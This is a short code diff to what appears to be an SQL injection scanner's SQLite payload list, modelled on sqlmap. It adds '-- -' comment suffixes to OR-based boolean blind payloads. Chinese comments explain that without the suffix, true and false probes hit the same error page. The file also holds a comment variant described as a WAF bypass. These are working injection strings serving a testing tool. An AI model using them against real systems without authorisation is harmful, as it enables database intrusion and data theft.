@@ -61,8 +61,10 @@ export const sqlitePayloads = {
     "{ORIG} AND 1=1",
     "{ORIG} AND 1=2",
     // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
-    "{ORIG}' OR '1'='1",
-    "{ORIG}' OR '1'='2",
+    // [D214] 补注释后缀：裸 OR 会被 WHERE 后续的 AND 条件续接 ⇒ 尾部引号未闭合 ⇒ 语法报错，
+    // 真/假两侧落同一张错页 ⇒ 布尔判据静默失效（真 SQLite 引擎实测，与 D209 同源）。
+    "{ORIG}' OR '1'='1'-- -",
+    "{ORIG}' OR '1'='2'-- -",
     // [8] 注释符变体（/**/ 块注释结尾，SQLite 支持 -- 与 /**/；WAF 绕过 / 尾注释双通道）
     "{ORIG}' AND '1'='1/**/",
     // —— 深度扩容：子查询布尔（sqlite_version 首字符 / 表存在 / 类型函数；真假对）——
